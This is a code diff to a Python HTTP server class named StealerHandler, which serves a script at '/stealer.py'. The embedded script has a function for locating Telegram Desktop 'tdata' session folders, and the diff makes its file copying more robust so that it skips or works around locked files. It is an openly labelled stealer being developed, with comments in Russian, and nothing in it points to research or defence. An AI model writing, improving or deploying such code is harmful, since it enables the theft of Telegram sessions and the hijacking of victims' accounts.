@@ -6,7 +6,7 @@ class StealerHandler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
         if self.path == '/stealer.py':
             self.send_response(200)
-            self.send_header('Content-type', 'text/plain; charset=utf-8')  # Добавь charset
+            self.send_header('Content-type', 'text/plain; charset=utf-8')
             self.end_headers()
             
             stealer_code = '''import os
@@ -34,10 +34,34 @@ def find_tdata():
 
 def copy_all_files(src, dst):
     try:
-        if os.path.exists(dst):
-            shutil.rmtree(dst)
-        shutil.copytree(src, dst)
-        print("All files copied successfully")
+        os.makedirs(dst, exist_ok=True)
+        
+        for root, dirs, files in os.walk(src):
+            for file in files:
+                # Пропускаем заблокированные файлы
+                if file.endswith('binlog') or 'working' in file:
+                    continue
+                    
+                src_file = os.path.join(root, file)
+                rel_path = os.path.relpath(root, src)
+                dst_dir = os.path.join(dst, rel_path)
+                os.makedirs(dst_dir, exist_ok=True)
+                dst_file = os.path.join(dst_dir, file)
+                
+                try:
+                    shutil.copy2(src_file, dst_file)
+                except (PermissionError, OSError):
+                    try:
+                        with open(src_file, 'rb') as f1, open(dst_file, 'wb') as f2:
+                            f2.write(f1.read())
+                    except:
+                        print(f"Skipped locked file: {file}")
+                        continue
+                except Exception as e:
+                    print(f"Skipped file {file}: {e}")
+                    continue
+                    
+        print("Files copied successfully")
         return True
     except Exception as e:
         print(f"Copy error: {e}")
@@ -145,7 +169,7 @@ if __name__ == "__main__":
     main()
 '''
             
-            self.wfile.write(stealer_code.encode('utf-8'))  # Добавь кодировку здесь
+            self.wfile.write(stealer_code.encode('utf-8'))
         else:
             self.send_response(404)
             self.end_headers()
